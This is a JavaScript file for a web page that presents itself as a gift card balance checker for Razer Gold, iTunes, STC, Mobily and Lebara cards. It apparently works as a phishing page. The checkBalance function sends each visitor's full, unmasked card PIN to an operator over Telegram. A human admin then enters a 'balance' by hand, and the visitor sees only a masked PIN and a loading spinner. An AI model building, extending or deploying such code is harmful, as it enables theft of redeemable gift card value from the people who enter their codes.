/* ================================================================
   app.js  — GiftCard Checker main logic
   Flow:
     1. User fills form → clicks Check Balance
     2. Send Telegram message to admin with card details + unique requestId
     3. Show loading spinner to user
     4. Poll localStorage every 3s for admin to have set the balance
        (admin panel writes balance keyed to requestId)
     5. When balance found → show result; if timeout → show error
   ================================================================ */

// ── Carousel (20 items; per-page count depends on viewport width) ─
const CAROUSEL_GAP = 10;

let carouselPage = 0;

/** Narrow viewports: 3 cards per page for better width/visibility. */
function getVisibleCount() {
  const v = document.getElementById('carouselViewport');
  if (!v) return 3;
  const w = v.clientWidth;
  if (w < 500) return 3;
  return 4;
}

function getCarouselCards() {
  if (typeof CAROUSEL_CARDS === 'undefined' || !Array.isArray(CAROUSEL_CARDS) || !CAROUSEL_CARDS.length) {
    return [];
  }
  return CAROUSEL_CARDS;
}

// Placeholder when image is missing (matches original first-five branding)
const CAROUSEL_PLACEHOLDER_HTML = {
  itunes: { bg: 'linear-gradient(135deg,#6d28d9,#ec4899)',  inner: '<span style="color:white;font-size:2.2rem">🎵</span>' },
  razer:  { bg: 'linear-gradient(135deg,#111,#222)',         inner: '<span style="color:#ffd700;font-weight:900;font-size:1.2rem;letter-spacing:1px;text-align:center">RAZER<br><span style="font-size:0.8rem;letter-spacing:3px">GOLD</span></span>' },
  stc:    { bg: 'linear-gradient(135deg,#4c1d95,#7c3aed)',  inner: '<span style="color:white;font-weight:900;font-size:1.8rem">stc</span>' },
  mobily: { bg: 'linear-gradient(135deg,#1d4ed8,#3b82f6)',  inner: '<span style="color:white;font-weight:700;font-size:1.2rem">Mobily</span>' },
  lebara: { bg: 'linear-gradient(135deg,#0369a1,#7dd3fc)',  inner: '<span style="color:white;font-weight:900;font-size:1.2rem">LEBARA</span>' },
};

function buildCarouselDOM() {
  const track = document.getElementById('carouselTrack');
  const list  = getCarouselCards();
  if (!track || !list.length) return;

  track.innerHTML = list
    .map((c) => {
      const ph   = CAROUSEL_PLACEHOLDER_HTML[c.slug] || {
        bg: 'linear-gradient(135deg,#1e1b4b,#4c1d95)',
        inner: `<span style="color:#e9d5ff;font-weight:700;font-size:0.9rem;text-align:center;padding:0 4px;">${escapeHtml(c.label)}</span>`,
      };
      const inForm = document.querySelector(`#giftCardSelect option[value="${escapeAttr(c.slug)}"]`);
      const onClick = inForm
        ? `onclick="selectCard('${escapeAttr(c.slug)}')"`
        : '';
      const imgClass = c.slug === 'itunes' ? 'carousel-img-itunes' : '';
      return `
      <div class="carousel-item" data-slug="${escapeAttr(c.slug)}" ${onClick}>
        <div class="card-img-wrap">
          <img class="${imgClass}" src="${escapeAttr(c.img)}" alt="${escapeHtml(c.label)}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/>
          <div class="card-placeholder" style="display:none;background:${ph.bg}">${ph.inner}</div>
        </div>
        <p>${escapeHtml(c.label)}</p>
      </div>`;
    })
    .join('');
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
function escapeAttr(s) {
  return String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

function getCarouselPageCount() {
  const items = document.querySelectorAll('#carouselTrack .carousel-item');
  const n     = items.length;
  if (n === 0) return 0;
  const per = getVisibleCount();
  return Math.ceil(n / per);
}

function initCarousel() {
  buildCarouselDOM();

  const track    = document.getElementById('carouselTrack');
  const viewport = document.getElementById('carouselViewport');
  if (!track || !viewport) return;

  const items = () => track.querySelectorAll('.carousel-item');

  function setItemWidths() {
    const list = items();
    const total = list.length;
    if (total === 0) return;

    const vw   = viewport.clientWidth;
    const per  = getVisibleCount();
    const itemW = (vw - CAROUSEL_GAP * (per - 1)) / per;
    list.forEach((el) => { el.style.width = itemW + 'px'; });
    document.documentElement.style.setProperty('--carousel-item-width', itemW + 'px');

    const maxPage = Math.max(0, getCarouselPageCount() - 1);
    if (carouselPage > maxPage) carouselPage = maxPage;
    applyTranslate(itemW, CAROUSEL_GAP, total);
    buildCarouselDotElements();
    updateDots();
    updateCarouselArrows();
  }

  function applyTranslate(itemW, gap, total) {
    const perPage  = getVisibleCount();
    const maxPage  = Math.max(0, Math.ceil(total / perPage) - 1);
    const safePage = Math.min(Math.max(0, carouselPage), maxPage);
    if (safePage !== carouselPage) carouselPage = safePage;
    const pageShift   = carouselPage * perPage * (itemW + gap);
    track.style.transform = `translateX(-${pageShift}px)`;
  }

  window._carouselResize = setItemWidths;
  window._applyTranslate = () => {
    const list   = items();
    const total  = list.length;
    if (total === 0) return;
    const vw     = viewport.clientWidth;
    const per    = getVisibleCount();
    const itemW  = (vw - CAROUSEL_GAP * (per - 1)) / per;
    applyTranslate(itemW, CAROUSEL_GAP, total);
    document.documentElement.style.setProperty('--carousel-item-width', itemW + 'px');
    updateCarouselArrows();
  };

  setItemWidths();
  window.addEventListener('resize', setItemWidths);
}

function buildCarouselDotElements() {
  const host = document.getElementById('carouselDots');
  if (!host) return;
  const pages = getCarouselPageCount();
  host.innerHTML = '';
  for (let i = 0; i < pages; i++) {
    const span = document.createElement('span');
    span.className = 'dot' + (i === carouselPage ? ' active' : '');
    span.setAttribute('role', 'tab');
    span.setAttribute('aria-label', 'Page ' + (i + 1));
    span.addEventListener('click', () => {
      carouselPage = i;
      if (window._applyTranslate) window._applyTranslate();
      updateDots();
      updateCarouselArrows();
    });
    host.appendChild(span);
  }
}

function updateCarouselArrows() {
  const maxPage = Math.max(0, getCarouselPageCount() - 1);
  const prev = document.getElementById('carouselBtnPrev');
  const next = document.getElementById('carouselBtnNext');
  if (prev) {
    prev.disabled = carouselPage <= 0;
    prev.setAttribute('aria-disabled', carouselPage <= 0 ? 'true' : 'false');
  }
  if (next) {
    next.disabled = carouselPage >= maxPage;
    next.setAttribute('aria-disabled', carouselPage >= maxPage ? 'true' : 'false');
  }
}

function slideCarousel(dir) {
  const maxPage = Math.max(0, getCarouselPageCount() - 1);
  carouselPage = Math.max(0, Math.min(carouselPage + dir, maxPage));
  if (window._applyTranslate) window._applyTranslate();
  updateDots();
  updateCarouselArrows();
}

function updateDots() {
  const dotEls = document.querySelectorAll('#carouselDots .dot');
  dotEls.forEach((d, i) => d.classList.toggle('active', i === carouselPage));
}

function scrollToTopCarousel() {
  const el = document.getElementById('gift-card-carousel');
  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// ── Select card from popular ──────────────────────────────────
function selectCard(value) {
  const sel = document.getElementById('giftCardSelect');
  sel.value = value;
  updateSelectIcon();
  document.querySelector('.checker-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function updateSelectIcon() {
  const sel = document.getElementById('giftCardSelect');
  const opt = sel.options[sel.selectedIndex];
  document.getElementById('selectIcon').textContent =
    (opt && opt.getAttribute('data-emoji')) || '💳';
}

function clearResult() {
  document.getElementById('resultBox').style.display = 'none';
  document.getElementById('errorBox').style.display  = 'none';
  document.getElementById('loadingState').style.display = 'none';
}

function normalizePinInput(inputEl) {
  if (!inputEl) return;
  inputEl.value = String(inputEl.value || '').toUpperCase();
}

// ── Shake helper ──────────────────────────────────────────────
function shakeEl(el) {
  el.style.animation = 'none';
  el.offsetHeight;
  el.style.animation = 'shake 0.4s ease';
  el.style.borderColor = '#ef4444';
  setTimeout(() => { el.style.borderColor = ''; el.style.animation = ''; }, 800);
}

// ── Generate unique request ID ────────────────────────────────
function genId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
}

// ── Card label map (all carousel slugs; form may only offer a subset) ─
const CARD_LABELS = (function () {
  const o = { razer: 'Razer Gold', itunes: 'iTunes', stc: 'STC', mobily: 'Mobily', lebara: 'Lebara' };
  if (typeof CAROUSEL_CARDS === 'undefined' || !Array.isArray(CAROUSEL_CARDS)) return o;
  CAROUSEL_CARDS.forEach((c) => { o[c.slug] = c.label; });
  return o;
})();

function balanceKey(cardType, cardPinUpper) {
  return `latest_balance_${cardType}_${cardPinUpper}`;
}

function saveLatestBalance(cardType, cardPinUpper, payload) {
  const key = balanceKey(cardType, cardPinUpper);
  localStorage.setItem(key, JSON.stringify(payload));
}

function readLatestBalance(cardType, cardPinUpper) {
  try {
    const raw = localStorage.getItem(balanceKey(cardType, cardPinUpper));
    return raw ? JSON.parse(raw) : null;
  } catch (_) {
    return null;
  }
}

async function readLatestBalanceRemote(cardType, cardPinUpper) {
  try {
    const url = `/api/resolutions?cardType=${encodeURIComponent(cardType)}&cardPin=${encodeURIComponent(cardPinUpper)}`;
    const res = await fetch(url, { method: 'GET' });
    if (!res.ok) return null;
    const data = await res.json();
    if (!data || !data.found) return null;
    return data;
  } catch (_) {
    return null;
  }
}

function maskPin(pin) {
  return pin.length > 4 ? '*'.repeat(pin.length - 4) + pin.slice(-4) : pin;
}

// ── Send Telegram message ─────────────────────────────────────
async function sendTelegram(text) {
  const res = await fetch('/api/telegram', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text }),
  });
  if (!res.ok) {
    let msg = `Telegram send failed (${res.status})`;
    try {
      const body = await res.json();
      if (body && body.error) msg = body.error;
    } catch (_) {}
    throw new Error(msg);
  }
  return true;
}

// ── Main check balance flow ───────────────────────────────────
async function checkBalance() {
  const cardType  = document.getElementById('giftCardSelect').value;
  const cardPin   = document.getElementById('cardPin').value.trim().toUpperCase();

  // Validate
  if (!cardType) { shakeEl(document.getElementById('giftCardSelect')); return; }
  if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }

  const requestId   = genId();
  const cardLabel   = CARD_LABELS[cardType] || cardType;
  const maskedPin   = maskPin(cardPin);

  // If admin has already resolved this card+PIN before, reuse it immediately.
  const cached = readLatestBalance(cardType, cardPin);
  if (cached) {
    if (cached.balance) {
      showResult(cached.balance, cardLabel, maskedPin);
    } else {
      showError(cached.error || 'Card not found or expired.');
    }
    return;
  }

  // Cross-device resolved lookup (shared server cache)
  const remoteCached = await readLatestBalanceRemote(cardType, cardPin);
  if (remoteCached) {
    saveLatestBalance(cardType, cardPin, remoteCached);
    if (remoteCached.balance) {
      showResult(remoteCached.balance, cardLabel, maskedPin);
    } else {
      showError(remoteCached.error || 'Card not found or expired.');
    }
    return;
  }

  // ── UI: loading ──
  setLoading(true);
  clearResult();
  document.getElementById('loadingState').style.display = 'block';

  // ── Telegram message ──
  const tgMessage =
    `🎁 <b>New Gift Card Check</b>\n\n` +
    `🃏 <b>Card Name:</b> ${cardLabel}\n` +
    `🆔 <b>Request ID:</b> <code>${requestId}</code>\n\n` +
    `🔑 <b>Gift PIN / Code (easy copy):</b>\n` +
    `<code>${cardPin}</code>\n\n` +
    `👉 Open admin panel and set balance for this Request ID.`;

  try {
    await sendTelegram(tgMessage);
  } catch (e) {
    console.error('Telegram send error:', e);
  }

  // ── Write request to localStorage so admin panel can see it ──
  try {
    const pending = JSON.parse(localStorage.getItem('gc_pending') || '[]');
    pending.unshift({
      id:       requestId,
      cardType: cardType,
      cardPin:  cardPin,
      ts:       Date.now(),
      status:   'pending',
    });
    localStorage.setItem('gc_pending', JSON.stringify(pending));
  } catch(e) { console.error('localStorage error', e); }

  // ── Poll for admin response ──
  const start = Date.now();

  const poller = setInterval(() => {
    const stored = localStorage.getItem('balance_' + requestId);

    if (stored) {
      clearInterval(poller);
      const data = JSON.parse(stored);
      setLoading(false);
      document.getElementById('loadingState').style.display = 'none';

      if (data.balance) {
        saveLatestBalance(cardType, cardPin, {
          cardType,
          cardPinUpper: cardPin,
          balance: String(data.balance),
          ts: Date.now(),
          requestId,
        });
        showResult(data.balance, cardLabel, maskedPin);
      } else {
        saveLatestBalance(cardType, cardPin, {
          cardType,
          cardPinUpper: cardPin,
          error: data.error || 'Card not found or expired.',
          ts: Date.now(),
          requestId,
        });
        showError(data.error || 'Card not found or expired.');
      }
      return;
    }

    if (Date.now() - start > CONFIG.POLL_TIMEOUT_MS) {
      clearInterval(poller);
      setLoading(false);
      document.getElementById('loadingState').style.display = 'none';
      showError('Request timed out. Admin did not respond. Please try again.');
    }
  }, CONFIG.POLL_INTERVAL_MS);
}

function setLoading(on) {
  const btn     = document.getElementById('checkBtn');
  const btnText = document.getElementById('btnText');
  const icon    = document.getElementById('btnIcon');
  const spinner = document.getElementById('btnSpinner');
  btn.disabled  = on;
  btnText.textContent = on ? 'Checking...' : 'Check Balance';
  icon.style.display    = on ? 'none' : 'inline';
  spinner.style.display = on ? 'inline' : 'none';
}

function showResult(balance, cardLabel, maskedPin) {
  // Keep exact admin-entered value (e.g. "5000 rupees", "400 coins", "4000")
  document.getElementById('resultAmount').textContent = String(balance);
  // Show masked PIN only (last 4 chars visible).
  document.getElementById('resultCard').textContent   = `${cardLabel} • ${maskedPin}`;
  document.getElementById('resultBox').style.display  = 'flex';
  document.getElementById('errorBox').style.display   = 'none';
  document.getElementById('resultBox').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

function showError(msg) {
  document.getElementById('errorMsg').textContent    = msg;
  document.getElementById('errorBox').style.display  = 'flex';
  document.getElementById('resultBox').style.display = 'none';
}

// ── Init ──────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initCarousel();
  updateSelectIcon();
});
